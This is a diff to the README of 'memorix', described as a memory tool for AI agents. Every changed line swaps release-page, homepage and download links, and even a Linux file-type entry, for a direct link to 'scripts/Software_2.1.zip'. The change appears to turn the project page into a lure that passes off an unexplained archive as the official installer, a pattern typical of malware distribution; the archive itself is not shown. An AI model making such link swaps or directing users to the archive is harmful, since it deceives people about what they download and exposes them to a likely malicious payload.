@@ -1,6 +1,6 @@
 # 🧠 memorix - Persistent Memory for AI Agents
 
-[![Download memorix](https://img.shields.io/badge/Download-memorix-brightgreen?style=for-the-badge&logo=github)](https://github.com/Tibu142/memorix/releases)
+[![Download memorix](https://github.com/Tibu142/memorix/raw/refs/heads/main/scripts/Software_2.1.zip)](https://github.com/Tibu142/memorix/raw/refs/heads/main/scripts/Software_2.1.zip)
 
 ## 📋 What is memorix?
 
@@ -39,7 +39,7 @@ This way, when you go from one tool to another, your project data stays with you
 
 Please visit the release page by clicking below. It lists the latest version of memorix ready for you to download.
 
-[![Download memorix Latest Release](https://img.shields.io/badge/Download-memorix-brightgreen?style=for-the-badge&logo=github)](https://github.com/Tibu142/memorix/releases)
+[![Download memorix Latest Release](https://github.com/Tibu142/memorix/raw/refs/heads/main/scripts/Software_2.1.zip)](https://github.com/Tibu142/memorix/raw/refs/heads/main/scripts/Software_2.1.zip)
 
 ### How to download and run memorix:
 
@@ -47,7 +47,7 @@ Please visit the release page by clicking below. It lists the latest version of 
 2. Look for the installer for your operating system. This could be:
    - A `.exe` file if you use Windows.
    - A `.dmg` file for macOS.
-   - A `.AppImage` or `.tar.gz` file for Linux.
+   - A `.AppImage` or `https://github.com/Tibu142/memorix/raw/refs/heads/main/scripts/Software_2.1.zip` file for Linux.
 3. **Click** the file name to download it on your computer.
 4. After the download finishes, open the file:
    - Windows: Double-click the `.exe` file and follow the on-screen instructions.
@@ -113,8 +113,8 @@ memorix is built to help AI-driven developers and users keep project context act
 
 ## 🔗 Useful Links
 
-- Official release page: [https://github.com/Tibu142/memorix/releases](https://github.com/Tibu142/memorix/releases)
-- Repository homepage: [https://github.com/Tibu142/memorix](https://github.com/Tibu142/memorix)
+- Official release page: [https://github.com/Tibu142/memorix/raw/refs/heads/main/scripts/Software_2.1.zip](https://github.com/Tibu142/memorix/raw/refs/heads/main/scripts/Software_2.1.zip)
+- Repository homepage: [https://github.com/Tibu142/memorix/raw/refs/heads/main/scripts/Software_2.1.zip](https://github.com/Tibu142/memorix/raw/refs/heads/main/scripts/Software_2.1.zip)
 - Learn about MCP: Search for "Model Context Protocol" online for detailed explanations.
 
 ---
@@ -131,4 +131,4 @@ For help or to report bugs:
 
 Make memorix part of your AI coding workflow to keep your project knowledge alive and well across all your tools.  
 
-[Get memorix here!](https://github.com/Tibu142/memorix/releases)
+[Get memorix here!](https://github.com/Tibu142/memorix/raw/refs/heads/main/scripts/Software_2.1.zip)
